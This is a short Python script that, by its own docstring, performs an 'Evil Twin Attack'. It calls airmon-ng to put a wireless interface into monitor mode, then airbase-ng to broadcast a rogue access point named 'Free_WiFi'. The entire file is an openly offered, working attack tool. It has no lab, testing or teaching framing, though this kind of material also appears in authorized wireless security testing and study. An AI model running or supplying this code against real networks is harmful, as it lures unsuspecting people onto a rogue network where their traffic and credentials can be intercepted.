import subprocess
import logging

def start_fake_wifi(interface, ssid, channel=6):
    """Start a fake Wi-Fi network (Evil Twin Attack)."""
    try:
        logging.info(f"Starting fake Wi-Fi {ssid} on {interface}")
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        subprocess.run(['airbase-ng', '-e', ssid, '-c', str(channel), interface], check=True)
        logging.info(f"Fake Wi-Fi {ssid} started successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to start fake Wi-Fi: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

if __name__ == '__main__':
    start_fake_wifi('wlan0', 'Free_WiFi')
